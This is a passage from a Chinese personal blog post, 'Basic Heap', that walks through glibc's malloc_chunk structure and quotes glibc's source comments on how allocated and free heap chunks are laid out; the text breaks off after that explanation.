

<!DOCTYPE html>
<html lang="zh-CN" data-default-color-scheme=auto>



<head>
  <meta charset="UTF-8">
  <link rel="apple-touch-icon" sizes="76x76" href="/img/f_128x128.jpg">
  <link rel="icon" href="/img/f_128x128.jpg">
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  
  <meta name="theme-color" content="#2f4154">
  <meta name="author" content="Ferity-Fan">
  <meta name="keywords" content="">
  
    <meta name="description" content="æˆ‘å¥½èœå•Šï¼ï¼ï¼ å‘œå‘œå‘œğŸ˜­">
<meta property="og:type" content="article">
<meta property="og:title" content="Basic Heap">
<meta property="og:url" content="https://ferity-fan.github.io/2022/10/20/Heap/index.html">
<meta property="og:site_name" content="Ferity-Fan&#39;s Blog">
<meta property="og:description" content="æˆ‘å¥½èœå•Šï¼ï¼ï¼ å‘œå‘œå‘œğŸ˜­">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="https://ferity-fan.github.io/2022/10/20/Heap/Heap.assets/image-20221018115053387.png">
<meta property="og:image" content="https://ferity-fan.github.io/2022/10/20/Heap/Heap.assets/image-20221018120411190.png">
<meta property="og:image" content="https://ferity-fan.github.io/2022/10/20/Heap/Heap.assets/image-20221018191719463.png">
<meta property="og:image" content="https://ferity-fan.github.io/2022/10/20/Heap/Heap.assets/image-20221018141013527.png">
<meta property="og:image" content="https://ferity-fan.github.io/2022/10/20/Heap/Heap.assets/image-20221018143836059.png">
<meta property="og:image" content="https://ferity-fan.github.io/2022/10/20/Heap/Heap.assets/image-20221018144012079.png">
<meta property="og:image" content="https://ferity-fan.github.io/2022/10/20/Heap/Heap.assets/image-20221018154602605.png">
<meta property="og:image" content="https://ferity-fan.github.io/2022/10/20/Heap/Heap.assets/image-20221020184215951.png">
<meta property="og:image" content="https://ferity-fan.github.io/2022/10/20/Heap/Heap.assets/image-20221020221315361.png">
<meta property="og:image" content="https://ferity-fan.github.io/2022/10/20/Heap/Heap.assets/image-20221018211322536.png">
<meta property="og:image" content="https://ferity-fan.github.io/2022/10/20/Heap/Heap.assets/image-20221018211539984.png">
<meta property="og:image" content="https://ferity-fan.github.io/2022/10/20/Heap/Heap.assets/image-20221018211632490.png">
<meta property="og:image" content="https://ferity-fan.github.io/2022/10/20/Heap/Heap.assets/image-20221018211608180.png">
<meta property="og:image" content="https://ferity-fan.github.io/2022/10/20/Heap/Heap.assets/image-20220814132821567.png">
<meta property="og:image" content="https://ferity-fan.github.io/2022/10/20/Heap/Heap.assets/image-20220814133216729.png">
<meta property="og:image" content="https://ferity-fan.github.io/2022/10/20/Heap/Heap.assets/image-20220816100317563.png">
<meta property="og:image" content="https://ferity-fan.github.io/2022/10/20/Heap/Heap.assets/image-20220816100752788.png">
<meta property="og:image" content="https://ferity-fan.github.io/2022/10/20/Heap/Heap.assets/image-20220816101120303.png">
<meta property="og:image" content="https://ferity-fan.github.io/2022/10/20/Heap/Heap.assets/image-20220814164430494.png">
<meta property="og:image" content="https://ferity-fan.github.io/2022/10/20/Heap/Heap.assets/image-20220814182744179.png">
<meta property="og:image" content="https://ferity-fan.github.io/2022/10/20/Heap/Heap.assets/image-20220814194641198.png">
<meta property="og:image" content="https://ferity-fan.github.io/2022/10/20/Heap/Heap.assets/image-20220814212052885.png">
<meta property="og:image" content="https://ferity-fan.github.io/2022/10/20/Heap/Heap.assets/image-20220814212638115.png">
<meta property="og:image" content="https://ferity-fan.github.io/2022/10/20/Heap/Heap.assets/image-20220814214814810.png">
<meta property="og:image" content="https://ferity-fan.github.io/2022/10/20/Heap/Heap.assets/image-20220820160146712.png">
<meta property="og:image" content="https://ferity-fan.github.io/2022/10/20/Heap/Heap.assets/image-20220820161049541.png">
<meta property="og:image" content="https://ferity-fan.github.io/2022/10/20/Heap/Heap.assets/image-20220820162024274.png">
<meta property="og:image" content="https://ferity-fan.github.io/2022/10/20/Heap/Heap.assets/image-20220820164643151.png">
<meta property="og:image" content="https://ferity-fan.github.io/2022/10/20/Heap/Heap.assets/image-20220820181022737.png">
<meta property="og:image" content="https://ferity-fan.github.io/2022/10/20/Heap/Heap.assets/image-20220820173211603.png">
<meta property="og:image" content="https://ferity-fan.github.io/2022/10/20/Heap/Heap.assets/image-20220820173412011.png">
<meta property="og:image" content="https://ferity-fan.github.io/2022/10/20/Heap/Heap.assets/image-20220820174021017.png">
<meta property="og:image" content="https://ferity-fan.github.io/2022/10/20/Heap/Heap.assets/image-20220820174213853.png">
<meta property="og:image" content="https://ferity-fan.github.io/2022/10/20/Heap/Heap.assets/image-20220820175408919.png">
<meta property="og:image" content="https://ferity-fan.github.io/2022/10/20/Heap/Heap.assets/image-20220820184826255.png">
<meta property="og:image" content="https://ferity-fan.github.io/2022/10/20/Heap/Heap.assets/image-20220821113749445.png">
<meta property="og:image" content="https://ferity-fan.github.io/2022/10/20/Heap/Heap.assets/image-20220821114003739.png">
<meta property="og:image" content="https://ferity-fan.github.io/2022/10/20/Heap/Heap.assets/image-20220821115406447.png">
<meta property="og:image" content="https://ferity-fan.github.io/2022/10/20/Heap/Heap.assets/image-20220821115524129.png">
<meta property="og:image" content="https://ferity-fan.github.io/2022/10/20/Heap/Heap.assets/image-20220821115602029.png">
<meta property="og:image" content="https://ferity-fan.github.io/2022/10/20/Heap/Heap.assets/image-20220821115655834.png">
<meta property="og:image" content="https://ferity-fan.github.io/2022/10/20/Heap/Heap.assets/image-20220821120333916.png">
<meta property="og:image" content="https://ferity-fan.github.io/2022/10/20/Heap/Heap.assets/image-20220903173420886.png">
<meta property="og:image" content="https://ferity-fan.github.io/2022/10/20/Heap/Heap.assets/image-20220903173447945.png">
<meta property="og:image" content="https://ferity-fan.github.io/2022/10/20/Heap/Heap.assets/image-20220903173735492.png">
<meta property="og:image" content="https://ferity-fan.github.io/2022/10/20/Heap/Heap.assets/image-20220903174353252.png">
<meta property="og:image" content="https://ferity-fan.github.io/2022/10/20/Heap/Heap.assets/image-20220903175411826.png">
<meta property="og:image" content="https://ferity-fan.github.io/2022/10/20/Heap/Heap.assets/image-20220903181246083.png">
<meta property="og:image" content="https://ferity-fan.github.io/2022/10/20/Heap/Heap.assets/image-20220903182117957.png">
<meta property="og:image" content="https://ferity-fan.github.io/2022/10/20/Heap/Heap.assets/image-20220903182811281.png">
<meta property="og:image" content="https://ferity-fan.github.io/2022/10/20/Heap/Heap.assets/image-20220916151609194.png">
<meta property="og:image" content="https://ferity-fan.github.io/2022/10/20/Heap/Heap.assets/image-20220916180441088.png">
<meta property="og:image" content="https://ferity-fan.github.io/2022/10/20/Heap/Heap.assets/image-20220916182208311.png">
<meta property="og:image" content="https://ferity-fan.github.io/2022/10/20/Heap/Heap.assets/image-20220929171044220.png">
<meta property="article:published_time" content="2022-10-20T14:25:00.000Z">
<meta property="article:modified_time" content="2022-10-20T14:25:01.000Z">
<meta property="article:author" content="Ferity-Fan">
<meta property="article:tag" content="glibc source code">
<meta name="twitter:card" content="summary_large_image">
<meta name="twitter:image" content="https://ferity-fan.github.io/2022/10/20/Heap/Heap.assets/image-20221018115053387.png">
  
  
  
  <title>Basic Heap - Ferity-Fan&#39;s Blog</title>

  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />



  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />

  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />

  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />



<!-- ä¸»é¢˜ä¾èµ–çš„å›¾æ ‡åº“ï¼Œä¸è¦è‡ªè¡Œä¿®æ”¹ -->
<!-- Do not modify the link that theme dependent icons -->

<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">



<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">


<link  rel="stylesheet" href="/css/main.css" />


  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
  
    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
  




  <script id="fluid-configs">
    var Fluid = window.Fluid || {};
    Fluid.ctx = Object.assign({}, Fluid.ctx)
    var CONFIG = {"hostname":"ferity-fan.github.io","root":"/","version":"1.9.2","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"left","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":"c2EbwsEz4vyQs2bqhNhwQHSS-gzGzoHsz","app_key":"7YTAevfoRuVqiwIQhf4uMsFe","server_url":null,"path":"window.location.pathname","ignore_local":false}},"search_path":"/local-search.xml"};

    if (CONFIG.web_analytics.follow_dnt) {
      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
    }
  </script>
  <script  src="/js/utils.js" ></script>
  <script  src="/js/color-schema.js" ></script>
  


  
<meta name="generator" content="Hexo 5.4.2"></head>


<body>
  

  <header>
    

<div class="header-inner" style="height: 70vh;">
  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
  <div class="container">
    <a class="navbar-brand" href="/">
      <strong>Ferity-Fan&#39;s Blog</strong>
    </a>

    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
            data-target="#navbarSupportedContent"
            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
      <div class="animated-icon"><span></span><span></span><span></span></div>
    </button>

    <!-- Collapsible content -->
    <div class="collapse navbar-collapse" id="navbarSupportedContent">
      <ul class="navbar-nav ml-auto text-center">
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/">
                <i class="iconfont icon-home-fill"></i>
                é¦–é¡µ
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/archives/">
                <i class="iconfont icon-archive-fill"></i>
                å½’æ¡£
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/categories/">
                <i class="iconfont icon-category-fill"></i>
                åˆ†ç±»
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/tags/">
                <i class="iconfont icon-tags-fill"></i>
                æ ‡ç­¾
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item dropdown">
              <a class="nav-link dropdown-toggle" target="_self" href="javascript:;" role="button"
                 data-toggle="dropdown" aria-haspopup="true" aria-expanded="false">
                <i class="iconfont icon-th-large"></i>
                Other
              </a>
              <div class="dropdown-menu" aria-labelledby="navbarDropdown">
                
                  
                  
                  
                  <a class="dropdown-item" target="_blank" rel="noopener" href="https://github.com/ferity-fan">
                    <i class="iconfont icon-github-fill"></i>
                    Github
                  </a>
                
                  
                  
                  
                  <a class="dropdown-item" href="/about/">
                    <i class="iconfont icon-user-fill"></i>
                    å…³äº
                  </a>
                
                  
                  
                  
                  <a class="dropdown-item" href="/links/">
                    <i class="iconfont icon-link-fill"></i>
                    å‹é“¾
                  </a>
                
              </div>
            </li>
          
        
        
          <li class="nav-item" id="search-btn">
            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
              &nbsp;<i class="iconfont icon-search"></i>&nbsp;
            </a>
          </li>
          
        
        
          <li class="nav-item" id="color-toggle-btn">
            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">&nbsp;<i
                class="iconfont icon-dark" id="color-toggle-icon"></i>&nbsp;</a>
          </li>
        
      </ul>
    </div>
  </div>
</nav>

  

<div id="banner" class="banner" parallax=true
     style="background: url('/img/pc_5.png') no-repeat center center; background-size: cover;">
  <div class="full-bg-img">
    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
      <div class="banner-text text-center fade-in-up">
        <div class="h2">
          
            <span id="subtitle" data-typed-text="Basic Heap"></span>
          
        </div>

        
          
  <div class="mt-3">
    
    
      <span class="post-meta">
        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
        <time datetime="2022-10-20 22:25" pubdate>
          2022å¹´10æœˆ20æ—¥ æ™šä¸Š
        </time>
      </span>
    
  </div>

  <div class="mt-1">
    
      <span class="post-meta mr-2">
        <i class="iconfont icon-chart"></i>
        
          132k å­—
        
      </span>
    

    
      <span class="post-meta mr-2">
        <i class="iconfont icon-clock-fill"></i>
        
        
        
          1099 åˆ†é’Ÿ
        
      </span>
    

    
    
  </div>


        
      </div>

      
    </div>
  </div>
</div>

</div>

  </header>

  <main>
    
      

<div class="container-fluid nopadding-x">
  <div class="row nomargin-x">
    <div class="side-col d-none d-lg-block col-lg-2">
      
  <aside class="sidebar" style="padding-left: 2rem; margin-right: -1rem">
    <div id="toc">
  <p class="toc-header"><i class="iconfont icon-list"></i>&nbsp;ç›®å½•</p>
  <div class="toc-body" id="toc-body"></div>
</div>



  </aside>


    </div>

    <div class="col-lg-8 nopadding-x-md">
      <div class="container nopadding-x-md" id="board-ctn">
        <div id="board">
          <article class="post-content mx-auto">
            <!-- SEO header -->
            <h1 style="display: none">Basic Heap</h1>
            
              <p class="note note-info">
                
                  
                    æœ¬æ–‡æœ€åæ›´æ–°äºï¼š2022å¹´10æœˆ20æ—¥ æ™šä¸Š
                  
                
              </p>
            
            
              <div class="markdown-body">
                
                <h1 id="Basic-Heap"><a href="#Basic-Heap" class="headerlink" title="Basic Heap"></a>Basic Heap</h1><h2 id="Basic-Knowledge"><a href="#Basic-Knowledge" class="headerlink" title="Basic Knowledge"></a>Basic Knowledge</h2><h3 id="malloc-chunk"><a href="#malloc-chunk" class="headerlink" title="malloc_chunk"></a>malloc_chunk</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/* </span><br><span class="hljs-comment">x64 -&gt; 8</span><br><span class="hljs-comment">x86 -&gt; 4</span><br><span class="hljs-comment">*/</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> INTERNAL_SIZE_T size_t</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> SIZE_SZ                (sizeof(INTERNAL_SIZE_T))</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> MALLOC_ALIGNMENT       (2 *SIZE_SZ)</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> MALLOC_ALIGN_MASK      (MALLOC_ALIGNMENT - 1)</span><br><span class="hljs-comment">/*</span><br><span class="hljs-comment">  This struct declaration is misleading (but accurate and necessary).</span><br><span class="hljs-comment">  It declares a &quot;view&quot; into memory allowing access to necessary</span><br><span class="hljs-comment">  fields at known offsets from a given base. See explanation below.</span><br><span class="hljs-comment">*/</span><br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">malloc_chunk</span> &#123;</span><br>	<br>    INTERNAL_SIZE_T prev_size;  <span class="hljs-comment">/* Size of previous chunk (if free).  */</span><br>    INTERNAL_SIZE_T size;       <span class="hljs-comment">/* Size in bytes, including overhead. */</span><br><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">malloc_chunk</span> *<span class="hljs-title">fd</span>;</span>         <span class="hljs-comment">/* double links -- used only if free. */</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">malloc_chunk</span> *<span class="hljs-title">bk</span>;</span><br><br>    <span class="hljs-comment">/* Only used for large blocks: pointer to next larger size.  */</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">malloc_chunk</span> *<span class="hljs-title">fd_nextsize</span>;</span> <span class="hljs-comment">/* double links -- used only if free. */</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">malloc_chunk</span> *<span class="hljs-title">bk_nextsize</span>;</span><br>&#125;;<br><br><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">malloc_chunk</span> *<span class="hljs-title">mbinptr</span>;</span><br><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">malloc_chunk</span> *<span class="hljs-title">mchunkptr</span>;</span><br><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">malloc_chunk</span> *<span class="hljs-title">mfastbinptr</span>;</span><br></code></pre></td></tr></table></figure>

<ul>
<li>prev_size ï¼šå¦‚æœä¸Šä¸€ä¸ªchunkå¤„äºé‡Šæ”¾çŠ¶æ€ï¼Œç”¨äºè¡¨ç¤ºå…¶å¤§å°</li>
<li>sizeï¼šè¡¨ç¤ºå½“å‰ chunk çš„å¤§å°</li>
<li>fd, bkï¼šä»…åœ¨å½“å‰chunkè¢«é‡Šæ”¾æ—¶æœ‰æ•ˆï¼Œç”¨æ¥è¡¨ç¤ºé“¾è¡¨ä¸­çš„ä¸Šä¸€ä¸ªchunkåŠä¸‹ä¸€ä¸ªchunk</li>
<li>fd_nextsizeï¼Œbk_nextsizeï¼šä»…åœ¨å½“å‰chunkè¢«é‡Šæ”¾æ—¶æœ‰æ•ˆï¼Œç”¨æ¥è¡¨ç¤ºé“¾è¡¨ä¸­çš„ä¸Šä¸€ä¸ªä¸åŒå¤§å°çš„chunkåŠä¸‹ä¸€ä¸ªä¸åŒå¤§å°çš„chunk</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/*</span><br><span class="hljs-comment">   malloc_chunk details:</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">    (The following includes lightly edited explanations by Colin Plumb.)</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">    Chunks of memory are maintained using a `boundary tag&#x27; method as</span><br><span class="hljs-comment">    described in e.g., Knuth or Standish.  (See the paper by Paul</span><br><span class="hljs-comment">    Wilson ftp://ftp.cs.utexas.edu/pub/garbage/allocsrv.ps for a</span><br><span class="hljs-comment">    survey of such techniques.)  Sizes of free chunks are stored both</span><br><span class="hljs-comment">    in the front of each chunk and at the end.  This makes</span><br><span class="hljs-comment">    consolidating fragmented chunks into bigger chunks very fast.  The</span><br><span class="hljs-comment">    size fields also hold bits representing whether chunks are free or</span><br><span class="hljs-comment">    in use.</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">    An allocated chunk looks like this:</span><br><span class="hljs-comment"></span><br><span class="hljs-comment"></span><br><span class="hljs-comment">    chunk-&gt; +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br><span class="hljs-comment">	    |             Size of previous chunk, if unallocated (P clear)  |</span><br><span class="hljs-comment">	    +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br><span class="hljs-comment">	    |             Size of chunk, in bytes                     |A|M|P|</span><br><span class="hljs-comment">      mem-&gt; +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br><span class="hljs-comment">	    |             User data starts here...                          .</span><br><span class="hljs-comment">	    .                                                               .</span><br><span class="hljs-comment">	    .             (malloc_usable_size() bytes)                      .</span><br><span class="hljs-comment">	    .                                                               |</span><br><span class="hljs-comment">nextchunk-&gt; +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br><span class="hljs-comment">	    |             (size of chunk, but used for application data)    |</span><br><span class="hljs-comment">	    +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br><span class="hljs-comment">	    |             Size of next chunk, in bytes                |A|0|1|</span><br><span class="hljs-comment">	    +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">    Where &quot;chunk&quot; is the front of the chunk for the purpose of most of</span><br><span class="hljs-comment">    the malloc code, but &quot;mem&quot; is the pointer that is returned to the</span><br><span class="hljs-comment">    user.  &quot;Nextchunk&quot; is the beginning of the next contiguous chunk.</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">    Chunks always begin on even word boundaries, so the mem portion</span><br><span class="hljs-comment">    (which is returned to the user) is also on an even word boundary, and</span><br><span class="hljs-comment">    thus at least double-word aligned.</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">    Free chunks are stored in circular doubly-linked lists, and look like this:</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">    chunk-&gt; +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br><span class="hljs-comment">	    |             Size of previous chunk, if unallocated (P clear)  |</span><br><span class="hljs-comment">	    +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br><span class="hljs-comment">    `head:&#x27; |             Size of chunk, in bytes                     |A|0|P|</span><br><span class="hljs-comment">      mem-&gt; +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br><span class="hljs-comment">	    |             Forward pointer to next chunk in list             |</span><br><span class="hljs-comment">	    +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br><span class="hljs-comment">	    |             Back pointer to previous chunk in list            |</span><br><span class="hljs-comment">	    +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br><span class="hljs-comment">	    |             Unused space (may be 0 bytes long)                .</span><br><span class="hljs-comment">	    .                                                               .</span><br><span class="hljs-comment">	    .                                                               |</span><br><span class="hljs-comment">nextchunk-&gt; +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br><span class="hljs-comment">    `foot:&#x27; |             Size of chunk, in bytes                           |</span><br><span class="hljs-comment">	    +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br><span class="hljs-comment">	    |             Size of next chunk, in bytes                |A|0|0|</span><br><span class="hljs-comment">	    +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">    The P (PREV_INUSE) bit, stored in the unused low-order bit of the</span><br><span class="hljs-comment">    chunk size (which is always a multiple of two words), is an in-use</span><br><span class="hljs-comment">    bit for the *previous* chunk.  If that bit is *clear*, then the</span><br><span class="hljs-comment">    word before the current chunk size contains the previous chunk</span><br><span class="hljs-comment">    size, and can be used to find the front of the previous chunk.</span><br><span class="hljs-comment">    The very first chunk allocated always has this bit set,</span><br><span class="hljs-comment">    preventing access to non-existent (or non-owned) memory. If</span><br><span class="hljs-comment">    prev_inuse is set for any given chunk, then you CANNOT determine</span><br><span class="hljs-comment">    the size of the previous chunk, and might even get a memory</span><br><span class="hljs-comment">    addressing fault when trying to do so.</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">    The A (NON_MAIN_ARENA) bit is cleared for chunks on the initial,</span><br><span class="hljs-comment">    main arena, described by the main_arena variable.  When additional</span><br><span class="hljs-comment">    threads are spawned, each thread receives its own arena (up to a</span><br><span class="hljs-comment">    configurable limit, after which arenas are reused for multiple</span><br><span class="hljs-comment">    threads), and the chunks in these arenas have the A bit set.  To</span><br><span class="hljs-comment">    find the arena for a chunk on such a non-main arena, heap_for_ptr</span><br><span class="hljs-comment">    performs a bit mask operation and indirection through the ar_ptr</span><br><span class="hljs-comment">    member of the per-heap header heap_info (see arena.c).</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">    Note that the `foot&#x27; of the current chunk is actually represented</span><br><span class="hljs-comment">    as the prev_size of the NEXT chunk. This makes it easier to</span><br><span class="hljs-comment">    deal with alignments etc but can be very confusing when trying</span><br><span class="hljs-comment">    to extend or adapt this code.</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">    The three exceptions to all this are:</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">     1. The special chunk `top&#x27; doesn&#x27;t bother using the</span><br><span class="hljs-comment">	trailing size field since there is no next contiguous chunk</span><br><span class="hljs-comment">	that would have to index off it. After initialization, `top&#x27;</span><br><span class="hljs-comment">	is forced to always exist.  If it would become less than</span><br><span class="hljs-comment">	MINSIZE bytes long, it is replenished.</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">     2. Chunks allocated via mmap, which have the second-lowest-order</span><br><span class="hljs-comment">	bit M (IS_MMAPPED) set in their size fields.  Because they are</span><br><span class="hljs-comment">	allocated one-by-one, each must contain its own trailing size</span><br><span class="hljs-comment">	field.  If the M bit is set, the other bits are ignored</span><br><span class="hljs-comment">	(because mmapped chunks are neither in an arena, nor adjacent</span><br><span class="hljs-comment">	to a freed chunk).  The M bit is also used for chunks which</span><br><span class="hljs-comment">	originally came from a dumped heap via malloc_set_state in</span><br><span class="hljs-comment">	hooks.c.</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">     3. Chunks in fastbins are treated as allocated chunks from the</span><br><span class="hljs-comment">	point of view of the chunk allocator.  They are consolidated</span><br><span class="hljs-comment">	with their neighbors only in bulk, in malloc_consolidate.</span><br><span class="hljs-comment">*/</span><br></code></pre></td></tr></table></figure>



